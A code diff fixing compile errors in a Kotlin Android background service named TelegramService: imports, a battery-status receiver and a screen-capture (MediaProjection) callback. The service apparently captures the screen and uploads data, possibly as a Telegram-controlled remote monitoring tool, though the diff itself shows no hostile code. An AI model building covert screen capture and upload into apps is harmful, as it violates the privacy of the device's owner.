@@ -26,8 +26,9 @@ import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
-import okhttp3.ResponseBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.asRequestBody
 import org.json.JSONObject
+import android.os.BatteryManager
 
 class TelegramService : Service() {
 
@@ -218,7 +219,7 @@ class TelegramService : Service() {
     }
 
     private fun getBattery(): Pair<Int, Boolean> {
-        val i = registerReceiver(null, Intent(Intent.ACTION_BATTERY_CHANGED))
+        val i = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
         if (i == null) return Pair(0, false)
         val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
         val scale = i.getIntExtra(BatteryManager.EXTRA_SCALE, 1)
@@ -314,7 +315,7 @@ class TelegramService : Service() {
         if (resultCode != android.app.Activity.RESULT_OK || data == null) return
         val mgr = getSystemService(MediaProjectionManager::class.java)
         mediaProjection = mgr.getMediaProjection(resultCode, data)
-        mediaProjection?.setCallback(object : MediaProjection.Callback() {
+        mediaProjection?.registerCallback(object : MediaProjection.Callback() {
             override fun onStop() { cleanupMediaProjection() }
         }, null)
         ensureVirtualDisplay()
